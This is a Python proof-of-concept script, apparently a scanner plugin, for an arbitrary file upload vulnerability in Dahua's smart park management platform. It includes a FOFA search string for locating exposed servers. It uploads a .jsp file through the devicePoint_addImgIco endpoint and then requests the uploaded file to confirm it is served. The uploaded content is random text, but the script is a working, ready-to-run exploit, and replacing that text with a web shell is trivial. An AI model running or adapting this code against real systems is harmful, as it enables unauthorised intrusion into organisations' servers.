#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/XNFVRrv_rJSDKyDmD9_oLw',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '大华智慧园区综合管理平台存在任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '"/WPMS/asset/lib/gridster/"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def substr(s,n,m):#返回字符串s的切片截取
  return s[n:m]
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'multipart/form-data; boundary=f3aeb22be281d77542546a2f71e20982',
      }
  target = '/emap/devicePoint_addImgIco?hasSubsystem=true'
  # jspname = randomLowercase(8)
  text = randomLowercase(15)
  subs = substr(text,1,10)
  data = f'''
--f3aeb22be281d77542546a2f71e20982
Content-Disposition: form-data; name="upload"; filename="a.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

{text}
--f3aeb22be281d77542546a2f71e20982--

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'code.*?data":.*?.jsp',res.text,re.S):
      res.close()
      jspname = re.search(r'code.*?data":(?P<filename>.*?).jsp',res.text,re.S)
      file = jspname.group('filename')
      filename = f'{url}/upload/emap/society_new/{file}.jsp'
      resp = requests.get(url=filename,headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and subs in resp.text:
        resp.close()
        ret['huixian'] =f'{filename}的内容为{subs}'
        ret['ifbug'] = True
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret

